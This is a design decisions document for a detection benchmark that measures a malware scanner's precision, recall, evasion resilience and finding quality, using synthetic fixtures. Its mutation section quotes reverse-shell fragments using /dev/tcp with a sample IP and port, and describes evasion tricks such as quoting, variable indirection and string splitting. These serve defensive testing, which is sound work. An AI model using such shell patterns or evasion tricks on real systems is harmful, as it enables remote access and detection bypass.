# Research & Architectural Decisions: Detection Accuracy & Validation Benchmark

**Feature**: Detection Accuracy & Validation Benchmark  
**Date**: 2026-10-03  
**Status**: Approved / Complete  

---

## 1. Architectural Strategy & Execution Model

### Decision: Dedicated Hermetic Benchmark Test Package (`test/benchmark/` & `internal/benchmark/`)
- **What was chosen**: Build the validation harness as a dedicated Go benchmarking suite under `test/benchmark/` (and internal utility package `internal/benchmark/`), runnable via standard `go test` with tags (`go test -v -tags yara ./test/benchmark/...`) and outputting structured JSON and Markdown summary reports.
- **Rationale**:
  1. Preserves **Constitutional Principle IV (Preserve Existing Architecture)** by not injecting benchmark-only dependencies or mock endpoints into production runtime binaries.
  2. Preserves **Constitutional Principle I (Forensic Safety & Read-Only Invariant)** by isolating all test fixtures within static test directories and ensuring the test harness operates strictly via `safeopen.OpenRegularReadOnly` and scanner interfaces.
  3. Enables seamless integration into CI/CD pipelines and local developer workflows without requiring root privileges or system configuration changes.
- **Alternatives Considered**:
  - *Adding a CLI command `aether benchmark` directly into the main binary*: Rejected as default because it bloats production binary size with test corpus fixtures and adds unnecessary CLI attack surface (violating Principle II). A standalone test binary/runner is far cleaner.

---

## 2. Corpus Architecture & Isolation Strategy

### Decision: Hermetic Portable Synthetic Fixtures (`testdata/benchmark_corpus/`)
- **What was chosen**: Structure the benchmark corpus into 5 isolated directories:
  - `testdata/benchmark_corpus/benign/` (11 subcategories)
  - `testdata/benchmark_corpus/malicious/` (12 subcategories)
  - `testdata/benchmark_corpus/suspicious/` (6 subcategories)
  - `testdata/benchmark_corpus/edge_cases/` (6 subcategories)
  - `testdata/benchmark_corpus/partial_visibility/` (4 subcategories)
  Each fixture is accompanied by an immutable JSON or YAML contract specification describing expected verdict, severity, evidence strength, and corroboration requirements.
- **Rationale**:
  1. Host independence: Tests do not depend on what packages happen to be installed on the operator's machine.
  2. Zero execution: Malicious test material consists exclusively of static text files, inert non-executable payloads, and simulated process/socket descriptors.
- **Alternatives Considered**:
  - *Testing live against host `/usr` and `/etc`*: Live host testing is useful for integration checks (like `benign_corpus_test.go`), but cannot provide deterministic ground truth for precision/recall benchmarking because host files vary widely across distros and may change over time.

---

## 3. Mathematical Metric Formulation, Zero-Denominator Safety & Triage Quality

### Decision: Strict Four-Quadrant Evaluation with Explicit Suspicious/Unknown Accounting & Zero-Denominator Safety
- **What was chosen**:
  - **True Positive ($TP$)**: Case in Category B (Malicious) correctly classified as `VerdictMalicious` with valid evidence strength (`StrengthDirect` or `StrengthCorroborated`) and required severity (`ALERT`).
  - **True Negative ($TN$)**: Case in Category A (Benign) correctly classified as `VerdictSafe` or emitting 0 threat findings.
  - **False Positive ($FP$)**: Case in Category A (Benign) or Category C (Suspicious) incorrectly classified as `VerdictMalicious` OR Category A fixture producing unjustified `ALERT`/`WARNING` without contextual suppression.
  - **False Negative ($FN$)**: Case in Category B (Malicious) classified as `VerdictSafe`, `VerdictUnknown`, or completely missed by all detectors.
  - **Zero-Denominator Guarded Formulas**:
    $$\text{Precision} = \begin{cases} 1.0 & \text{if } TP = 0 \land FP = 0 \\ 0.0 & \text{if } TP + FP = 0 \land FP > 0 \\ \frac{TP}{TP + FP} & \text{otherwise} \end{cases}$$
    $$\text{Recall} = \begin{cases} 1.0 & \text{if } TP = 0 \land FN = 0 \\ 0.0 & \text{if } TP + FN = 0 \land FN > 0 \\ \frac{TP}{TP + FN} & \text{otherwise} \end{cases}$$
    $$\text{F1} = \begin{cases} 0.0 & \text{if } \text{Precision} + \text{Recall} = 0.0 \\ 2 \times \frac{\text{Precision} \times \text{Recall}}{\text{Precision} + \text{Recall}} & \text{otherwise} \end{cases}$$
    $$\text{FPR} = \begin{cases} 0.0 & \text{if } FP + TN = 0 \\ \frac{FP}{FP + TN} & \text{otherwise} \end{cases}$$
    $$DCI = \frac{\text{Detected Malicious Threat Subclasses}}{\text{Total Cataloged Malicious Threat Subclasses (12)}} \times 100\%$$
- **Dedicated Triage & Abstention Metrics**:
  - `SuspiciousTriageAccuracy`: Percentage of Category C cases triaged as `SUSPICIOUS` (penalizing over-escalation to `MALICIOUS` ($FP$) and under-classification to `SAFE` ($FN$)).
  - `AbstentionAccuracy`: Percentage of Category E cases reported as `UNKNOWN` (penalizing false clean passes `SAFE` or false alarms `MALICIOUS`).
  - Strict invariant: `UNKNOWN != SAFE`.
- **Rationale**: Prevents runtime panics and invalid `NaN`/`Inf` in JSON serialization while ensuring that neither over-escalating weak signals nor blindly suppressing suspicious anomalies can inflate precision or recall.

---

## 4. Static Evasion & Mutation Framework

### Decision: Deterministic Lexical Mutation Engine
- **What was chosen**: Create a safe static mutator in `internal/benchmark/mutator.go` that generates syntactically valid variants of malicious fixtures:
  1. *Quoting & Escaping*: Single/double quotes inside paths and flags (e.g. `"/dev/tcp"/'10.0.0.1'/4444`).
  2. *Whitespace & Line Folding*: Multi-space, tab insertion, and escaped newlines (`\`).
  3. *Shell Variable Substitution*: Indirection (`CMD=sh; $CMD -i >& /dev/tcp/...`).
  4. *Alternate Interpreters*: Executing via `dash`, `zsh`, `python3.11`, `ruby3`.
  5. *Obfuscated String Fragments*: Splitting command strings into concatenated chunks.
- **Rationale**: Evaluates static regex and YARA rule resilience without running scripts. Generates an **Evasion Resilience Score**:
  $$\text{Evasion Resilience} = \begin{cases} 0.0 & \text{if Total Mutations} = 0 \\ \frac{\text{Mutations Detected}}{\text{Total Mutations Tested}} \times 100\% & \text{otherwise} \end{cases}$$

---

## 5. Explainability Verification Standard

### Decision: Automated 8-Question Quality Gate (`internal/benchmark/explainability.go`)
- **What was chosen**: Every finding emitted during benchmark execution is checked by an automated validator against the 8-question contract:
  1. `WHAT`: Finding Title $\neq$ empty and RuleName $\neq$ empty.
  2. `WHERE`: Path $\neq$ empty or LineNumber $>0$ or PID $>0$.
  3. `WHY`: Plain-English risk explanation (`Why` field) $\ge 30$ characters.
  4. `EVIDENCE`: Cryptographic SHA-256 $\neq$ empty (for files), matched string/condition $\neq$ empty.
  5. `CONTEXT`: `PackageStatus` populated (`verified_package`, `unowned`, `modified_package`) and `ContextProfile` populated (`standard`, `doc_metadata`, `package_test`, `build_tree`, `pentest_tool`).
  6. `CORROBORATION`: List of corroborating signals recorded when evidence strength is `StrengthCorroborated`.
  7. `CONFIDENCE`: Confidence level (`HIGH`, `MEDIUM`, `LOW`) and non-empty `ConfidenceRationale`.
  8. `REMEDIATION`: Actionable remediation slice with $\ge 1$ clear step.
- **Rationale**: Ensures findings are human-actionable and forensic-grade. Any finding failing this check fails the benchmark quality gate.

---

## 6. Relative Path Normalization Strategy

### Decision: Hermetic Relative Path Normalization
- **What was chosen**: Normalize all finding paths relative to the benchmark corpus root directory before contract evaluation, deduplication, and serialization.
- **Rationale**: Eliminates environmental variance caused by absolute path differences on local developer workstations vs CI runners, guaranteeing 100% byte-for-byte deterministic reproducibility.

---

## 7. Hermetic Package Database Simulation

### Decision: In-Memory `PackageDB` Mock Injection
- **What was chosen**: Instantiate an in-memory `pkgdb.MockPackageDB` populated from case manifests (`is_package_owned`, `package_name`) for all benchmark runs, avoiding any dependency on host package managers (`/var/lib/dpkg`, `/var/lib/pacman`).
- **Rationale**: Guarantees identical execution on Debian, Arch, Alpine, and containerized CI environments without altering production `pkgdb.PackageDB` implementation.
